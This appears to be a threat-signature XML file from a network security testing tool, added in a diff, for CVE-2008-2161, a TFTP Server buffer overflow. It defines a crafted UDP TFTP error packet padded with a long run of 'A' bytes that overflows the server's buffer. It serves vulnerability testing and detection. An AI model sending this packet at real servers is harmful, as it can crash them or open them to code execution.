@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="TFTP Server Error Packet Handling Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in TFTP Server. The flaw is due to improper handling of TFTP error packets with overly long error messages. An unauthenticated remote attacker can exploit this vulnerability by sending crafted TFTP error packets to the target host. Successful attack could allow for arbitrary code execution with privileges of the server process, normally System on Windows platforms and root on UNIX/Linux platforms. If the attack is not successful in code injection and execution, the target TFTP server process will terminate upon exploitation. If an attack results in successful code injection and its subsequent execution, the behaviour of the target host will depend on the intention of the attacker. Note that any code execution will be within the security context of the affected service, normally System."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="TFTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="TFTP_Server_Project"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="TFTP_Server_Project_TFTP_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="TFTP_Server_Project_TFTP_Server_SP_1.4"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-2161"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="e819a839ea8399dfda421d33c1b2c901"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634002944998441895"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1264674602" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="sourcePort" type="ImperfectControls.Port" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="TFTPdestPort" type="ImperfectControls.Port" value="null" index="J"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="F"/>
+      <for index="D"/>
+      <for index="G"/>
+      <for index="E"/>
+      <for index="J"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0406" Identification="E627" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="$sourcePort" destPort="$TFTPdestPort" checksum="" length="03F2" Payload="000541414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
